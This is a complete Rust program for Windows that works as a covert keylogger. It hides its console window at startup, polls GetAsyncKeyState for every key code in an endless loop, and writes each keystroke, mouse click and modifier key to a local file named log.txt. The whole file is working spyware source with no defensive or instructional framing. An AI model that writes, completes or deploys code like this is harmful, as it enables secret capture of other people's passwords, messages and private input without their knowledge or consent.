
use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
use windows::Win32::System::Console::GetConsoleWindow;

use windows::Win32::UI::WindowsAndMessaging::{
    SW_HIDE,
    ShowWindow
};


use std::{fs::File,io::Write};
use std::{thread, time};


fn main() {
    let window = unsafe {GetConsoleWindow()}; 
    unsafe {ShowWindow(window, SW_HIDE);}
    
	startLogging();
}



fn startLogging(){
    let path = r"log.txt";

    let mut output = File::create(path).expect("Impossible write log.");

    // let duration = time::Duration::from_millis(1);

	loop{

		for c in 0..256{
			if unsafe {GetAsyncKeyState(c)} == -32767{
                let key:String = match c as u32{
                    1 => "[LEFT-CLICK]".into(),
                    2 => "[RIGHT-CLICK]".into(),
                    8 => "[Backspace]".into(),
                    9 => "[TAB]".into(),
                    13 => " [ENTER]\n".into(),
                    32 => " ".into(),

                    37 => "[LEFT]".into(),
                    38 => "[UP]".into(),
                    39 => "[RIGHT]".into(),
                    40 => "[DOWN]".into(),


                    160|16 => "[SHIFT]".into(),
                    162|17 => "[CTRL]".into(),
                    164|18 => "[ALT]".into(),
                    190|110 => ".".into(),
                    _=>(c as u8 as char).to_string()
                };
                // print!("\x1B[2J\x1B[1;1H");
                println!(">> {:?}",(&key,c));
                write!(output, "{}",key).expect("Impossible write");
            }
        }		
        // thread::sleep(duration);
    }
}



